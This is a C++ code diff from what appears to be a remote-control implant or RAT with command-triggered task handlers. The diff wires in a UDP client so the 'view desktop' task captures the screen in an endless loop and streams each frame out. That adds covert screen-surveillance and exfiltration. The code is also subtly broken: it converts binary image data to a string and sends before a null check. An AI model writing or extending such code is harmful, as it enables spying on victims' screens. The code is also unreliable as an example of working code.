@@ -1,7 +1,7 @@
 #include "..\pch.h"
 
 #include "Commands.hpp"
-// #include "..\Network\UDPConnection.hpp"
+#include "..\Network\UDPConnection.hpp"
 #include "ScreenCapturer.hpp"
 #include "..\Debugger.h"
 
@@ -29,12 +29,19 @@ VOID _on_task_MESSAGEBOX(CONST PVOID args, std::string &result)
 		result = TASK_SUCCESSA;
 }
 
-VOID SendDesktopScreen(LPVOID socket)
+VOID SendDesktopScreen()
 {
 	static DirectXParametrs dxp;
+	static UDPClient udpclient;
+	static BOOL init = FALSE;
+
+	if (!init)
+		init = udpclient.init();
 	while (TRUE)
 	{
 		LPBYTE shot = CaptureScreen(&dxp);
+
+		udpclient.send(std::string(reinterpret_cast<char*>(shot)));
 
 		if(shot)
 			delete[] shot;
@@ -44,22 +51,13 @@ VOID SendDesktopScreen(LPVOID socket)
 VOID _on_task_VIEWDESKTOP(CONST PVOID args, std::string &result)
 {
 	static HANDLE hThread = NULL;
-	static SOCKET socket  = INVALID_SOCKET;
 
 	int x = 0;
-	if (_stscanf_s(static_cast<PTCHAR>(args), TEXT("%d"), &x) == 0) // No args == start or work(if started)
+	if (_stscanf_s(reinterpret_cast<std::string*>(args)->c_str(), TEXT("%d"), &x) == 0) // No args == start or work(if started)
 	{
 		if (!hThread)
 		{
-			socket = INVALID_SOCKET; // InitUDPClient();
-			if (socket == INVALID_SOCKET)
-			{
-				result = TASK_FAILUREA;
-
-				return;
-			}
-
-			hThread = CreateThread(NULL, 0, reinterpret_cast<LPTHREAD_START_ROUTINE>(&SendDesktopScreen), &socket, 0, NULL);
+			hThread = CreateThread(NULL, 0, reinterpret_cast<LPTHREAD_START_ROUTINE>(&SendDesktopScreen), 0, 0, NULL);
 			if(!hThread)
 				result = TASK_FAILUREA;
 			else
